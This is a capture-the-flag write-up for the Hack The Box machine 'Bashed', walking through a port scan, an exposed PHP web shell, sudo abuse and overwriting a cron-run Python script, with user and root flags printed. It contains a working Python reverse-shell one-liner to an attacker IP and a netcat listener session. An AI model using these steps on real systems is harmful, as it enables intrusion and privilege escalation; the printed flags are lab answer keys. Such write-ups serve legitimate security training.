# Bashed

> Write-up author: jon-brandy
 
## STEPS:

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/06d890ab-a95a-4c82-bc6f-c774d0792714)

> PORT SCANNING

```
┌──(brandy㉿bread-yolk)-[~]
└─$ nmap -p- -sVC 10.10.10.68 --min-rate 1000
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-25 02:31 PDT
Stats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Nmap scan report for 10.10.10.68
Host is up (0.019s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.82 seconds
```

1. Based from the result, the machine is running a web application.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/bda28df5-de80-4de6-aff5-d6e891c3015e)


2. Found an interesting directory --> `/dev` which leads to a file named `phpbash.php`.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/29cabec6-e47c-4ed4-90d5-fd801b6dd53d)

 
3. Why it's interesting, because the webpage documented about it, and based from the documentation it gives us a shell.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/02196f2f-b47e-4490-8a0a-275115c0bb24)


> GITHUB DOCUMENTATION

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c7329fd1-1c43-40c2-8020-5c5ced9658f6)


4. So, opening the phpbash.php file will give us a shell.

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/37acbeb0-1408-4712-8884-e985d34e4f54)


> GETTING USER FLAG

```
www-data@bashed
:/home# cd arrexel

www-data@bashed
:/home/arrexel# ls

user.txt
www-data@bashed
:/home/arrexel# cat user.txt

9d72b1d760c30a335315b4c35a83d8f5
```

## USER FLAG

```
9d72b1d760c30a335315b4c35a83d8f5
```

5. To get the root flag, obviously we need to do privesc.
6. Let's see are there any sudo permissions for `www-data`.

> RESULT

```
www-data@bashed
:/home/arrexel# sudo -l

Matching Defaults entries for www-data on bashed:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL
```

7. Interesting, we can run any command as scriptmanager.
8. Well to use the sudoers permission, we need to do reverse shell, i used this reverse shell payload template:

```py
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.25",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

9. Set a listener at port 1337 then run the script at the webshell.

> RESULT - We got shell.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/130ccffa-a05c-4638-b602-ae05aae78ec3)


10. Now we can run the sudo permission.

```
┌──(brandy㉿bread-yolk)-[~]
└─$ nc -nvlp 1337
listening on [any] 1337 ...
connect to [10.10.14.25] from (UNKNOWN) [10.10.10.68] 38330
$ whoami
whoami
www-data
$ sudo -l
sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
$ sudo -u scriptmanager bash -i
sudo -u scriptmanager bash -i
scriptmanager@bashed:/var/www/html/dev$ whoami    
whoami
scriptmanager
scriptmanager@bashed:/var/www/html/dev$
```

> Found 2 interesting files.

```
scriptmanager@bashed:/$ ls
ls
bin   etc         lib         media  proc  sbin     sys  var
boot  home        lib64       mnt    root  scripts  tmp  vmlinuz
dev   initrd.img  lost+found  opt    run   srv      usr
scriptmanager@bashed:/$ cd scripts
cd scripts
scriptmanager@bashed:/scripts$ ls
ls
test.py  test.txt
scriptmanager@bashed:/scripts$ 
```

11. At glance there's no vulnerability at all, but what's interesting here is the .txt file's timestamp keeps updating everytime.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/8ee6646e-0ef2-478f-82d7-fe0d81737f21)


12. Knowing this, my assumption is the test.py is executed every minute (there is a cron job or any background process that runs the python script automatically.

### FLOW

```
1. Creating a fake test.py which has our reverse shell payload.
2. Run python http.server.
3. Then run wget on our reverse shell to grab the fake test.py from our local machine.
```

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/f5c83800-5da1-44ca-8d2c-e2675c392093)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b8fa0fd0-dff6-4d73-a607-88f8d585f743)


> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/180b8ea3-07e7-437f-b6c9-3c2ace516176)


> GETTING ROOT FLAG

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/6b35da8d-633e-4349-9dc8-506fd9b93d30)


## ROOT FLAG

```
b1f52542e66c5b9aa0c7f33be686b63a
```
